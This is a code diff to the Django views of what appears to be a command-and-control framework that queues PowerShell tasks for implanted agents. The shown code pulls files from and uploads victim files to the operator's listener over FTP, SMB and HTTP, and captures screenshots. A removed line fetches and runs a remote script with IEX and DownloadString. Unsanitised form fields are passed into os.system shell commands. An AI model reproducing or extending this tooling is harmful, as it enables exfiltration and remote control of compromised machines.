@@ -111,10 +111,11 @@ def Download_SMB(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        ip = request.POST['ip']
-        port = request.POST['port']
-        fileName = request.POST['fileName']
-        task = "copy \\{0}:{1}\share\{2}".format(ip,port,fileName)
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        serverport = request.POST['serverport'] ##
+        fileName = request.POST['fileName'] ##
+        task = "copy \\{0}:{1}\share\{2}".format(ip,serverport,fileName)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -131,9 +132,10 @@ def Download_FTP(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        ip = request.POST['ip']
-        filename = request.POST['filename']
-        outpath = request.POST['outpath']
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        filename = request.POST['filename'] ##
+        outpath = request.POST['outpath']   ##
         task = "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(New-Object Net.WebClient).DownloadFile('ftp://{0}/{1}', '{2}')".format(ip,filename, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -153,10 +155,11 @@ def Invoke_fileUpload(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
 
-        serverport = request.POST['serverport']
-        ip = request.POST['ip']
-        filepath = request.POST['filepath']
-        task = "Invoke-FileUpload -Uri http://{0}:{1}/upload -File {2}".format(ip,serverport,filepath)
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        serverport = request.POST['serverport'] ##
+        uploadfile = request.POST['uploadfile'] ##
+        task = "Invoke-FileUpload -Uri http://{0}:{1}/upload -File {2}".format(ip,serverport,uploadfile)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -174,11 +177,12 @@ def FTP_fileUpload(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        serverport = request.POST['serverport']
-        ip = request.POST['ip']
-        filepath = request.POST['filepath']
-        outfile = request.POST['outfile']
-        task = "(New-Object Net.WebClient).UploadFile('ftp://{0}:{1}/{2}', '{3}')".format(ip,serverport,outfile,filepath)
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        serverport = request.POST['serverport']  ##
+        uploadfile = request.POST['uploadfile']  ##
+        outfile = request.POST['outfile']  ##
+        task = "(New-Object Net.WebClient).UploadFile('ftp://{0}:{1}/{2}', '{3}')".format(ip,serverport,outfile,uploadfile)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -195,14 +199,12 @@ def open_pythonserver(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-
-        timeout = request.POST['timeout']
-        serverport = request.POST['serverport']
-        directory = request.POST['directory']
-
+        timeout = request.POST['timeout']   ##
+        serverport = request.POST['serverport']  ##
+        directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============Python_Server_For_{0}_seconds_>>_{1}==============='; timeout {0} python -m http.server {3} --directory {2} ;".format(timeout,result_path,directory,serverport))
+        os.system("echo '++++++++++++++++++`r`n`t`r`n===============Python_Server_For_{0}_seconds_>>_{1}==============='; timeout {0} python -m http.server {3} --directory {2} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -214,12 +216,12 @@ def open_SMBserver(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        timeout = request.POST['timeout']
-        serverport = request.POST['serverport']
-        directory = request.POST['directory']
+        timeout = request.POST['timeout']   ##
+        serverport = request.POST['serverport']   ##
+        directory = request.POST['directory'] ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============SMB_Server_For_{0}_seconds>>_{1}==============='; timeout {0} impacket-smbserver share -smb2support {2} -port {3};".format(timeout,result_path,directory,serverport))
+        os.system("echo '++++++++++++++++++`r`n`t`r`n===============SMB_Server_For_{0}_seconds>>_{1}==============='; timeout {0} impacket-smbserver share -smb2support {2} -port {3} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -231,12 +233,12 @@ def open_FTPserver(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        timeout = request.POST['timeout']
-        serverport = request.POST['serverport']
-        directory = request.POST['directory']
+        timeout = request.POST['timeout']  ##
+        serverport = request.POST['serverport']  ##
+        directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2};".format(timeout,result_path,directory,serverport))
+        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} &".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')    
@@ -249,12 +251,12 @@ def open_PY_UploadServer(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        timeout = request.POST['timeout']
-        serverport = request.POST['serverport']
-        directory = request.POST['directory']
+        timeout = request.POST['timeout'] ##
+        serverport = request.POST['serverport'] ##
+        directory = request.POST['directory'] ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m uploadserver --port {3} --directory {2} --write;;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
+        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m uploadserver --port {3} --directory {2} --write &;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')                                               
@@ -267,17 +269,15 @@ def open_FTP_UploadServer(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        timeout = request.POST['timeout']
-        serverport = request.POST['serverport']
-        directory = request.POST['directory']
+        timeout = request.POST['timeout'] ##
+        serverport = request.POST['serverport']  ##
+        directory = request.POST['directory']  ##
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} --write;;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
+        os.system("echo '++++++++++++++++++`r`n`t`r`n===============FTP_Upload_Server_For_{0}_seconds>>{1}==============='; timeout {0}  python3 -m pyftpdlib --port {3} --directory {2} --write &;echo '++++++++++++++++++`r`n`t`r`n'".format(timeout,result_path,directory,serverport))
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
-
-
 
 
 def env_var(request):
@@ -416,7 +416,7 @@ def ScreenShot(request):
         os.system("timeout 20 python3 -m http.server 8888 --directory {} &".format(tools_path))
         # f = open("{}".format(current_path+"/screenshot"), "rt")
         #(New-Object Net.WebClient).DownloadFileAsync("http://{}:8888/screenshot.ps1", $env:userprofile'\screenshot.ps1');import-module
-        task = 'IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/screenshot.ps1")'.format(ip)
+        task = '[Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;$graphics = [Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);$bmp.Save($path);$graphics.Dispose();$bmp.Dispose();};$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080);screenshot $bounds $env:userprofile"/screenshot.png"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
